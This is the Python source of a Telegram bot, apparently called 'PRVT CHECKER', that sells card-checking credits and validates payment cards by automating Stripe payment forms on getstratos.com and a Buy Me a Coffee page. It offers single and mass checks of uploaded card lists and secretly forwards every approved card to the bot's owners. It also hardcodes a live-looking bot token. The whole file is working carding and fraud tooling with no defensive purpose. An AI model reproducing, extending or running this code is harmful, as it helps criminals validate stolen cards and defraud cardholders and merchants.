import os
import secrets
import random
import string
import json
import asyncio
import requests
from playwright.async_api import async_playwright
import telebot
import crypto

BOT_TOKEN = "7411456530:AAGxdudOrhnAS-AlaAdHq2RmOxHeHQ3gjEo"
BIN_API_URL = "https://lookup.binlist.net"
bot = telebot.TeleBot(BOT_TOKEN)

def generate_random_email_password():
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@example.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return email, password

def generate_random_username():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

credits_file_path = './credits.json'
owners_file_path = './owners.json'
codes_file_path = './codes.json'

owners = json.load(open(owners_file_path, 'r')) if os.path.exists(owners_file_path) else ['Enter your user id']
credits = json.load(open(credits_file_path, 'r')) if os.path.exists(credits_file_path) else {}
redeem_codes = json.load(open(codes_file_path, 'r')) if os.path.exists(codes_file_path) else {}

def initialize_user_credits(user_id):
    # Ensure the user has credits set correctly
    if str(user_id) not in credits:
        credits[str(user_id)] = 500  # Non-owners get 500 credits by default
    if str(user_id) in owners:
        credits[str(user_id)] = float('inf')  # Owners have unlimited credits
    save_credits()

def save_credits():
    with open(credits_file_path, 'w') as f:
        json.dump(credits, f, indent=4)

def deduct_credits(user_id):
    if str(user_id) in owners:
        return True
    if credits[str(user_id)] > 0:
        credits[str(user_id)] -= 1
        save_credits()
        return True
    return False

def fetch_bin_info(bin_number):
    try:
        response = requests.get(f"{BIN_API_URL}/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("scheme", "Unknown").upper(),
                "type": data.get("type", "Unknown").upper(),
                "issuer": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", ""),
                "currency": data.get("country", {}).get("currency", "Unknown")
            }
        else:
            return {"brand": "Unknown", "type": "Unknown", "issuer": "Unknown", "country": "Unknown", "flag": "", "currency": "Unknown"}
    except Exception as e:
        return {"brand": "Unknown", "type": "Unknown", "issuer": "Unknown", "country": "Unknown", "flag": "", "currency": "Unknown"}

async def check_getstratos_card(card_number, expiry_date, cvv):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        try:
            await page.goto("https://getstratos.com/my-account/add-payment-method/")
            email, password = generate_random_email_password()
            await page.fill("input#reg_email", email)
            await page.fill("input#reg_password", password)
            await page.wait_for_selector("button[name='register']", state="attached")
            await page.evaluate("""() => { const registerButton = document.querySelector("button[name='register']"); if (registerButton) { registerButton.click(); } }""")
            await page.wait_for_load_state("networkidle")
            card_frame = await page.wait_for_selector("iframe[title='Secure card number input frame']")
            card_frame = await card_frame.content_frame()
            await card_frame.fill("input[name='cardnumber']", card_number)
            expiry_frame = await page.wait_for_selector("iframe[title='Secure expiration date input frame']")
            expiry_frame = await expiry_frame.content_frame()
            await expiry_frame.fill("input[name='exp-date']", expiry_date)
            cvv_frame = await page.wait_for_selector("iframe[title='Secure CVC input frame']")
            cvv_frame = await cvv_frame.content_frame()
            await cvv_frame.fill("input[name='cvc']", cvv)
            await page.click("button:has-text('ADD PAYMENT METHOD')")
            await asyncio.sleep(10)
            if "Payment method successfully added." in await page.content():
                return "Approved card✅"
            else:
                return "Declined card❌"
        except Exception as e:
            return f"Error: {str(e)}"
        finally:
            await browser.close()

async def simulate_bmc_payment(card, user_id):
    result = {"success": False, "reason": "Declined❌"}
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            await page.goto("https://buymeacoffee.com/koolinlin")
            random_username = generate_random_username()
            random_email = generate_random_email_password()[0]
            await page.fill('input[placeholder="Name or @yoursocial"]', random_username)
            await page.click('button:has-text("Support")')
            await page.wait_for_timeout(2000)
            await page.fill('input[placeholder="Email"]', random_email)
            await page.click('button:has-text("Pay")')
            await page.wait_for_timeout(2)
            stripe_frame = await page.wait_for_selector('iframe[name^="__privateStripeFrame"]')
            frame = await stripe_frame.content_frame()
            await frame.fill('input[name="cardnumber"]', card['number'])
            await frame.fill('input[name="exp-date"]', f'{card["expiry_month"]}/{card["expiry_year"]}')
            await frame.fill('input[name="cvc"]', f'{card["cvv"]}')
            if await frame.is_visible('input[name="postal"]'):
                await frame.fill('input[name="postal"]', '100080')
            await page.click('button:has-text("Pay with Card")')
            await page.wait_for_timeout(20000)
            body_content = await page.text_content('body')
            if "Thank you for supporting" in body_content:
                result = {"success": True, "reason": "Approved✅"}
            else:
                result = {"success": False, "reason": "Declined❌"}
            await browser.close()
    except Exception as e:
        result = {"success": False, "reason": f"Error: {str(e)}"}
    return result

def format_message(card, result, bin_info, gateway):
    return f"✵ PRVT CHECKER ✵\n------------------------------------------------\nCARD {card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}\nGATEWAY {gateway}\nSTATUS= {result['reason']}\n--------------BIN INFO-------------\nINFO= {bin_info['brand']}/{bin_info['type']}\nISSUER= {bin_info['issuer']}\nCOUNTRY= {bin_info['country']} {bin_info['flag']}\nCURRENCY= {bin_info['currency']}\n──────────✉───────────\nBY : @kuntaldebnath"

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    initialize_user_credits(user_id)
    
    # Display credits properly based on whether the user is an owner or not
    if str(user_id) in owners:
        credits_display = "Unlimited"
    else:
        credits_display = credits[str(user_id)]
    
    bot.reply_to(message, f"Welcome, to PRVT CHECKER, {message.from_user.first_name}!\nYour Telegram ID: {user_id}\nCredits: {credits_display}")

@bot.message_handler(commands=['info'])
def info_command(message):
    user_id = message.from_user.id
    initialize_user_credits(user_id)
    bot.reply_to(message, f"Your Credits: {'Unlimited' if str(user_id) in owners else credits[str(user_id)]}")

@bot.message_handler(commands=['chk'])
def handle_check_command(message):
    user_id = message.from_user.id
    if not deduct_credits(user_id):
        bot.reply_to(message, "❌ You do not have enough credits!")
        return
    try:
        command = message.text.strip()
        if not command.startswith("/chk "):
            bot.reply_to(message, "Invalid format! Use: /chk ccnumber|mm|yy|cvv")
            return
        card_info = command.split("/chk ")[1].strip()
        card_parts = card_info.split("|")
        if len(card_parts) != 4:
            bot.reply_to(message, "Invalid format! Use: /chk ccnumber|mm|yy|cvv")
            return
        card_number = card_parts[0].strip()
        expiry_date = f"{card_parts[1].strip()}/{card_parts[2].strip()}"
        cvv = card_parts[3].strip()
        bin_info = fetch_bin_info(card_number[:6])
        bot.reply_to(message, "Processing your card, please wait...")
        result = asyncio.run(check_getstratos_card(card_number, expiry_date, cvv))
        formatted_message = format_message({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, {"reason": result}, bin_info, "STRIPE AUTH")
        bot.reply_to(message, formatted_message)
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['str'])
def handle_bmc_command(message):
    user_id = message.from_user.id
    if not deduct_credits(user_id):
        bot.reply_to(message, "❌ You do not have enough credits!")
        return
    try:
        command = message.text.strip()
        if not command.startswith("/str "):
            bot.reply_to(message, "Invalid format! Use: /str ccnumber|mm|yy|cvv")
            return
        card_info = command.split("/str ")[1].strip()
        card_parts = card_info.split("|")
        if len(card_parts) != 4:
            bot.reply_to(message, "Invalid format! Use: /str ccnumber|mm|yy|cvv")
            return
        card_number = card_parts[0].strip()
        expiry_date = f"{card_parts[1].strip()}/{card_parts[2].strip()}"
        cvv = card_parts[3].strip()
        bin_info = fetch_bin_info(card_number[:6])
        bot.reply_to(message, "Processing your card, please wait...")
        result = asyncio.run(simulate_bmc_payment({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, message.from_user.id))
        formatted_message = format_message({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, result, bin_info, "STRIPE 1.00$")
        bot.reply_to(message, formatted_message)
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['add'])
def add_command(message):
    user_id = message.from_user.id
    if str(user_id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    parts = message.text.split(' ')
    if len(parts) < 2:
        bot.reply_to(message, "❌ Invalid format! Use: /add <new_owner_user_id>")
        return
    new_owner_id = parts[1]
    if new_owner_id not in owners:
        owners.append(new_owner_id)
        with open(owners_file_path, 'w') as f:
            json.dump(owners, f, indent=4)
        bot.reply_to(message, f"✅ {new_owner_id} added as an owner.")
    else:
        bot.reply_to(message, "❌ This user is already an owner.")

@bot.message_handler(commands=['addcr'])
def add_credits_command(message):
    user_id = message.from_user.id
    if str(user_id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    parts = message.text.split(' ')
    if len(parts) < 3:
        bot.reply_to(message, "❌ Invalid format! Use: /addcr <user_id> <credits>")
        return
    target_user_id = parts[1]
    try:
        credits_to_add = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Credits must be a number!")
        return
    if target_user_id not in credits:
        initialize_user_credits(target_user_id)
    credits[target_user_id] += credits_to_add
    save_credits()
    bot.reply_to(message, f"✅ Added {credits_to_add} credits to {target_user_id}.")

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    code = message.text.split(' ')[1]
    
    if code in redeem_codes:
        credits[str(user_id)] += redeem_codes[code]
        save_credits()
        bot.reply_to(message, f"✅ Code redeemed! You now have {credits[str(user_id)]} credits.")
    else:
        bot.reply_to(message, "❌ Invalid code.")
        
@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    user_id = message.from_user.id
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    # Create a unique directory for the user
    user_dir = f"./{user_id}_files"
    os.makedirs(user_dir, exist_ok=True)

    # Save the uploaded file
    file_path = f"{user_dir}/uploaded_cards.txt"
    with open(file_path, "wb") as f:
        f.write(downloaded_file)

    bot.reply_to(message, "✅ File uploaded successfully! Reply to this message with /mchk or /mstr to start checking.")

@bot.message_handler(commands=['mchk'])
def handle_mass_check(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a valid file message with /mchk.")
        return

    user_id = message.from_user.id
    user_dir = f"./{user_id}_files"
    file_path = f"{user_dir}/uploaded_cards.txt"

    if not os.path.exists(file_path):
        bot.reply_to(message, "❌ No uploaded file found. Please upload a file first.")
        return

    with open(file_path, "r") as file:
        cards = file.readlines()

    approved_cards = []  # List to store approved cards
    bot.reply_to(message, f"📃 Starting mass check for {len(cards)} cards...")

    for card_line in cards:
        try:
            card_parts = card_line.strip().split('|')
            if len(card_parts) != 4:
                bot.send_message(user_id, f"❌ Invalid format: {card_line.strip()}")
                continue

            card_number = card_parts[0].strip()
            expiry_date = f"{card_parts[1].strip()}/{card_parts[2].strip()}"
            cvv = card_parts[3].strip()
            bin_info = fetch_bin_info(card_number[:6])
            result = asyncio.run(check_getstratos_card(card_number, expiry_date, cvv))

            if "Approved" in result:
                approved_cards.append(card_line.strip())

            formatted_message = format_message({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, {"reason": result}, bin_info, "STRIPE AUTH")
            bot.send_message(user_id, formatted_message)
        except Exception as e:
            bot.send_message(user_id, f"❌ Error processing card: {card_line.strip()}\nError: {str(e)}")

    # Notify owners with all approved cards
    if approved_cards:
        for owner_id in owners:
            try:
                bot.send_message(owner_id, f"📋 Approved Cards from User {user_id}:\n" + "\n".join(approved_cards))
            except Exception as e:
                print(f"Failed to notify owner {owner_id}: {e}")

    bot.send_message(user_id, "✅ Mass check completed.")

@bot.message_handler(commands=['mstr'])
def handle_mass_stripe_check(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a valid file message with /mstr.")
        return

    user_id = message.from_user.id
    user_dir = f"./{user_id}_files"
    file_path = f"{user_dir}/uploaded_cards.txt"

    if not os.path.exists(file_path):
        bot.reply_to(message, "❌ No uploaded file found. Please upload a file first.")
        return

    with open(file_path, "r") as file:
        cards = file.readlines()

    approved_cards = []  # List to store approved cards
    bot.reply_to(message, f"📃 Starting mass check for {len(cards)} cards...")

    for card_line in cards:
        try:
            card_parts = card_line.strip().split('|')
            if len(card_parts) != 4:
                bot.send_message(user_id, f"❌ Invalid format: {card_line.strip()}")
                continue

            card_number = card_parts[0].strip()
            expiry_date = f"{card_parts[1].strip()}/{card_parts[2].strip()}"
            cvv = card_parts[3].strip()
            bin_info = fetch_bin_info(card_number[:6])
            result = asyncio.run(simulate_bmc_payment({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, user_id))

            if result.get("success"):
                approved_cards.append(card_line.strip())

            formatted_message = format_message({'number': card_number, 'expiry_month': card_parts[1], 'expiry_year': card_parts[2], 'cvv': cvv}, result, bin_info, "STRIPE 1.00$")
            bot.send_message(user_id, formatted_message)
        except Exception as e:
            bot.send_message(user_id, f"❌ Error processing card: {card_line.strip()}\nError: {str(e)}")

    # Notify owners with all approved cards
    if approved_cards:
        for owner_id in owners:
            try:
                bot.send_message(owner_id, f"📋 Approved Cards from User {user_id}:\n" + "\n".join(approved_cards))
            except Exception as e:
                print(f"Failed to notify owner {owner_id}: {e}")

    bot.send_message(user_id, "✅ Mass check completed.")
    
@bot.message_handler(commands=['code'])
def code_command(message):
    user_id = message.from_user.id
    if str(user_id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    parts = message.text.split(' ')
    if len(parts) < 3:
        bot.reply_to(message, "❌ Invalid format! Use: /code <how_many> <credits_per_code>")
        return
    try:
        how_many = int(parts[1])
        credits_per_code = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Both arguments must be numbers!")
        return
    codes = []
    for _ in range(how_many):
        code = secrets.token_bytes(16).hex()  # Generate a random code
        redeem_codes[code] = credits_per_code
        codes.append(code)
    with open(codes_file_path, 'w') as f:
        json.dump(redeem_codes, f, indent=4)
    bot.reply_to(message, f"✅ Generated the following codes:\n{', '.join(codes)}")

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(non_stop=True)